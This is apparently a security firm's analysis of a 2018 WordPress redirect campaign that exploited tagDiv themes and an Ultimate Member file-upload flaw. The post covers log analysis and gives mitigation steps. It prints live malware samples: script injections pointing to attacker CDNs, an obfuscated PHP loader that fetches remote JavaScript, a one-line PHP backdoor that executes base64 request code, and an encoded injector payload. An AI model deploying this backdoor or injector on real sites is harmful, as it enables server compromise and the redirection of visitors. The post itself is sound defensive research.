@@ -1,0 +1,116 @@
+Massive WordPress Redirect Campaign Targets Vulnerable tagDiv Themes and Ultimate Member Plugins
+
+This August, we’ve seen a new massive wave of WordPress infections that redirect visitors to unwanted sites.
+Malicious redirect via utroro[.]comWhen redirected, users see annoying pages with random utroro[.]com addresses and fake reCAPTCHA images. The messages and content try to convince visitors to verify and subscribe to browser notifications without disclosing the purpose of this behavior.
+Alternative redirect URLs include:
+hxxp://murieh[.]space/?h=930130016_dc950a456f7_100&h_l=&h_5=sub_id_2&h_2=def_sub
+
+hxxps://unverf[.]com/?h=930130016_dc950a456f7_100&h_l=&h_5=sub_id_2&h_2=def_sub
+Injected Scripts
+The injected malware involves a script from one of the following two sites: cdn.eeduelements[.]com and cdn.allyouwant[.]online.
+The former was used in the initial stages of the campaign and the latter was introduced about a week later. However, due to laziness or poor coding skills, the attackers didn’t remove the previously injected code when they reinfected the websites with the new version of the malware – so you can find both scripts on the same sites.
+...
+<script type='text/javascript' src='hxxps://cdn.eeduelements[.]com/jquery.js?ver=1.0.8'></script><script type='text/javascript' src='hxxps://cdn.allyouwant[.]online/main.js?t=lp1'></script></head>
+...
+At the moment of writing, we see 1700+ sites with the cdn.eeduelements[.]com script and 500+ sites with the cdn.allyouwant[.]online script.
+Obfuscated Scripts
+Adding plain text references to  external scripts is only one type of injection that this campaign uses, however. We’re also seeing various modifications of obfuscated scripts from  the same domains.
+For example, this code adds the “hxxps://cdn.allyouwant[.]online/main.js?t=ac” script to a page
+Obfuscated cdn.allyouwant[.]online scriptAnd this code uses the src.eeduelements[.]com/get.php address to fetch a URL that contains a redirect script. At this moment, I can see hxxps://gabemastery[.]ml/ton.js there.
+Obfuscated src.eeduelements[.]com/get.php script
+Main Attack Vectors
+The main contributors to this wave of infections are the two year old (and long fixed) vulnerability in tagDiv themes and the newly discovered (and already fixed) vulnerability in a popular Ultimate Member plugin, which boasts 100,000+ active installations.
+For outdated tagDiv themes, a typical injection looks like this:
+Malware injected via vulnerability in old Newsmag theme
+Log Analysis
+For sites without tagDiv themes, the infection vector was not initially clear. As always, raw log analysis helped us find the exploited security hole.
+The following session looked very suspicious:
+185.177.59.23 - - [11/Aug/2018:10:24:59 -0700] "POST /wp-content/plugins/ultimate-member/core/lib/upload/um-image-upload.php HTTP/1.1" 200 183 "-" "Go-http-client/1.1"
+
+185.177.59.23 - - [11/Aug/2018:10:25:02 -0700] "GET /wp-content/uploads/ultimatemember/temp/xJiEq0SCtv7MVS1H8Gbqfw26dOyzJihc5nlgEl7j/stream_photo_d41e21781c3fad9e1f22c1c4ba60e3c7_5b6f1bed7cf51.php HTTP/1.1" 200 4731 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
+
+185.177.59.23 - - [11/Aug/2018:10:25:02 -0700] "GET /wp-content/uploads/ultimatemember/temp/xJiEq0SCtv7MVS1H8Gbqfw26dOyzJihc5nlgEl7j/n.php?q=ZWNobyAiNTQzNjQ1NiI7 HTTP/1.1" 200 27 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
+Right after making a POST request to an um-image-upload.php file of the Ultimate Member plugin, someone requested the same file which appeared to have been uploaded by the previous request. What made things more suspicious is the fact that the uploaded file had a .php extension (stream_photo_d41e21781c3fad9e1f22c1c4ba60e3c7_5b6f1bed7cf51.php), while the plugin was supposed to upload image files only.
+Almost immediately afterwards, the same user accessed another PHP file (n.php) in the same directory where the Ultimate Member plugin had uploaded the previous file. The request had the “?q=ZWNobyAiNTQzNjQ1NiI7” GET parameter, which translated to “echo “5436456”;”.
+Given that all three consecutive requests from the same visitor had different User-Agent strings, it was clear that it was a hacker attack – a successful hacker attack.
+At that point, it was still not clear whether this attack had to do with the redirects we investigated or if it was an unrelated infection.
+We then found this request from the same IP:
+185.177.59.23 - - [11/Aug/2018:16:22:40 -0700] "GET /wp-content/uploads/ultimatemember/temp/QkqkY6iF0xN5L3r5tAtwi9rIPeTRAFxsUcYNbfVr/n.php?q=JGEgPSAnZmluZCAvIC10eXBlIGYgLW5hbWUgIipoZWFkKiIgfCB4YXJncyBncmVwIC1ybCAiPGhlYWQiJzsKJGwxID0gIjxzY3JpcHQgdHlwZT0ndGV4dC9qYXZhc2NyaXB0JyBzcmM9J2h0dHBzOi8vY2RuLmVlZHVlbGVtZW50cy5jb20vanF1ZXJ5LmpzP3Zlcj0xLjAuOCc+PC9zY3JpcHQ+IjsKJHQgPSBzaGVsbF9leGVjKCRhKTsKJHQgPSBleHBsb2RlKCJcbiIsIHRyaW0oJHQpKTsKZm9yZWFjaCgkdCBhcyAkZil7CgkKJGcgPSBmaWxlX2dldF9jb250ZW50cygkZik7CmlmIChzdHJwb3MoJGcsICdlZWR1ZWxlbWVudHMnKSAhPT0gZmFsc2UpIHsKICAgZWNobyAiZToiLiRmOwp9IGVsc2UgewokZyA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRmKTsKJGcgPSBzdHJfcmVwbGFjZSgiPGhlYWQ+IiwiPGhlYWQ+Ii4kbDEsJGcpOwokZyA9IHN0cl9yZXBsYWNlKCI8L2hlYWQ+IiwkbDEuIjwvaGVhZD4iLCRnKTsKQHN5c3RlbSgiY2htb2QgNzc3ICIuJGYpOwpAZmlsZV9wdXRfY29udGVudHMoJGYsJGcpOwokZyA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRmKTsKaWYgKHN0cnBvcygkZywgJ2VlZHVlbGVtZW50cycpICE9PSBmYWxzZSkgewogICBlY2hvICRmOwp9IAp9Cn0= HTTP/1.1" 500 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
+The GET request was for a similarly uploaded backdoor, n.php, but this time the base64-encoded payload was much longer.
+Here’s the decoded payload:
+cdn.eeduelements[.]com injector in the decoded payloadBingo! It’s clear that this code searches for files with “head” in their names and with the <head> tag inside their content. It then injects the malicious cdn.eeduelements[.]com/jquery.js script right after the <head> tag, and right before the closing </head> tag.
+Buggy Injector
+This injector code was a bit of an overkill. Most of the infected web pages have multiple inclusions of the same malicious scripts.
+That’s not the only problem with the injector. This code doesn’t take into account the <head> words inside PHP comments. As a result, we see the script injected into comments too.
+jQuery Files
+The obfuscated versions of the script are only supposed to be injected into JavaScript files. However, this was not done properly either. The attacker decided to inject it at the top of any files with “jquery” in their filenames and “jQuery” inside their content.
+find / -type f -name "*jquery*" | xargs grep -rl "jQuery"
+The usual suspects like wp-includes/js/jquery/jquery.js and wp-includes/js/jquery/jquery-migrate.min.js weren’t the only files infected. Because of the buggy injector, many files in third-party themes and plugins were impacted, including:
+
+wp-content/themes/twentyseventeen/assets/js/jquery.scrollTo.js,
+wp-content/plugins/elementor/assets/lib/jquery-easing/jquery-easing.js
+wp-content/plugins/gp-premium/page-header/functions/js/jquery.vide.min.js
+
+Non-JS files have also been affected. For example, the script was injected into the WordPress core CSS files: wp-includes/css/jquery-ui-dialog-rtl.min.css, wp-includes/css/jquery-ui-dialog.min.css, etc.
+PHP Injection
+On some sites, we found a variation of this malware that injected the following code into PHP files:
+<?php error_reporting(0); ini_set(chr(100).chr(105).chr(115).chr(112).chr(108).chr(97).chr(121).chr(95).chr(101).chr(114).chr(114).chr(111).chr(114).chr(115), 0); echo @file_get_contents(chr(104).chr(116).chr(116)....skipped....chr(46).chr(106).chr(115)); ?>
+The code injects content from the hxxps://alsutrans[.]com/stats.js URL (which is basically the same obfuscated JavaScript that we described above) into web pages.
+The main problem with this variation is that it injects the code before the “<?php” tag and assumes that only one such tag exists at the top of the file. Anyone familiar with PHP knows that this is not true and many PHP files (especially WordPress theme files) have multiple “<?php” tags.
+As a result, infected files usually look like this:
+Multiple injections in PHP files
+This leads to dozens of injected scripts in generated web pages. Moreover, this code frequently breaks the HTML markup when it is injected inside tags, as seen here:
+Multiple injections and broken HTML markup
+When it became clearer that hackers used a security hole in the Ultimate Member plugin, we decided to check whether it was some old vulnerability like in the case with tagDiv theme or something relatively new.
+Vulnerability in the Ultimate Member Plugin
+It turns out that the Ultimate Member plugin fixed some security issues just a few days ago, including an Unauthenticated Arbitrary File Upload vulnerability which was fixed on August 9th, 2018.
+2.0.23: August 10, 2018
+
+Bugfixes:
+
+Fixed File/Image uploader
+
+2.0.22: August 9, 2018
+
+...
+
+Bugfixes:
+
+...
+
+Fixed security vulnerabilities (File/Image uploader)
+The attacks were spotted in the wild before the plugin was patched. Once the information about the fixed issue was published, it didn’t take long for hackers to add the vulnerability to their toolkits.
+In the logs we analyzed, we see the first successful attempts to exploit that security hole on August 11th, just two days after the release of version 2.0.22 where the issue was initially addressed. Around that time, we registered an increased number of infections covered in this article. This proves once again that website owners have a very short window between the disclosure of a vulnerability and first massive attempts to exploit it –especially for popular themes and plugins.
+Attack Scenario
+Now that we know about the problem with the Ultimate Member plugin (before v.2.0.22), we can reconstruct a typical attack scenario.
+Firstly, hackers probe WordPress sites for presence of the Ultimate Member plugin.
+When they find it, they use the vulnerability to upload a fake image, which is usually an image file with added PHP code. This fake image ends up in a random looking subdirectory inside wp-content/uploads/ultimatemember/temp with a semi-random name. Example below.
+wp-content/uploads/ultimatemember/temp/WdSGzebLWHdyFKBxnl8WeVH79qLeLCBTlZlmpik9/stream_photo_1629b0420ba2002e27f81ee0f7164a19_5b70072a3a639.php
+
+That file is then used to create a more generic backdoor n.php in the same folder.
+<?php file_put_contents('sdgsdfgsdg','<?php '.base64_decode($_REQUEST['q'])); include('sdgsdfgsdg'); unlink('sdgsdfgsdg'); ?>
+This backdoor saves arbitrary PHP code, which is passed in the “q” request parameter in a temporary file ‘sdgsdfgsdg‘. And then executes it by including it to the current script.
+The initial request to the newly created n.php backdoor comes with the parameters “?q=ZWNobyAiNTQzNjQ1NiI7” to print a predefined string “5436456”, which is used to make sure the backdoor works correctly.
+After that, the attackers use this backdoor to inject a variety of different malicious code into files on the server.
+Generally, two types of files are being infected when the conditions outlined below are met:
+
+Files that contain <head> tags and have “head” in their names. Usually this includes header.php files
+Files that contain the word “jQuery” inside their content and “jquery” in their names.
+
+Every few days, hackers return and reuse the n.php backdoor (or upload a new one) to reinfect websites with a new revision of the malicious code. Because of the poor quality of the injector, you may find different versions of the malware sitting in the same file.
+Cross-Site Infections
+The malware injector starts searching for eligible files from the server root (find / …). As a result, this attack tries to infect any suitable writable file, even those outside of the initial compromised site directory.
+On most hosting environments, successful infections will be limited to files that belong to one server account. However, if the account has more than one site, all the sites will be infected (even if they don’t have the Ultimate Member plugin or any vulnerable components). Non-WordPress sites will be infected too. Moreover, all neighboring sites that share the same account will continue to be reinfected unless all of them are properly cleaned and hardened.
+Mitigation
+This attack uses several different infection vectors and multiple variations of the malicious code. Here, we’ll try to cover mitigation steps for the most common ones.
+
+Make sure to update all themes and plugins. This is especially important if your site uses the Ultimate Member (older than 2.0.23) plugin, or one of the tagDiv’s themes (Newspaper, Newsmag, etc.).
+In the case of tagDiv attack vector, the malware can be found and removed in the theme’s admin interface via. Theme panel > ADS > YOUR HEADER AD, or in the “Custom HTML” widget. Alternatively, you can work directly with the WordPress database, but be careful cleaning the serialized code.
+In the case of the Ultimate Member attack vector, delete all PHP files in subdirectories under wp-content/uploads/ultimatemember/temp/ (for bonus points, disable execution of PHP files in this folder), and then remove the malicious code mentioned in this post from “header” and “jquery” files.
+Make sure to clean and harden all the sites that share the same server account, even those that don’t have any vulnerable themes and plugins. If you fail to do this, your sites may be reinfected pretty soon.
+
+This campaign frequently changes the injected code and affected files, and these instructions are not definitive. Please consult with our guides on cleaning WordPress sites to find more generic instructions that will help you deal with most types of WordPress infections.
+Conclusion
+This massive infection clearly demonstrates how zero-day attacks occur and exponentially grow during the vulnerability window.
+When vulnerabilities are disclosed, the volume of opportunistic attacks often immediately increases. Hackers are vigilant and monitor closely for changes of popular themes and plugins. If a bad actor sees that a security issue has been fixed, they will try to create exploits for older versions to target vulnerable sites who haven’t yet patched to the latest available version.
+Timely updates of all site components are very important to minimize the risk of infection. If you are concerned that you are unable to maintain updates to your themes, CMS, and plugins, your best option is a website firewall that can block the majority of new attacks.
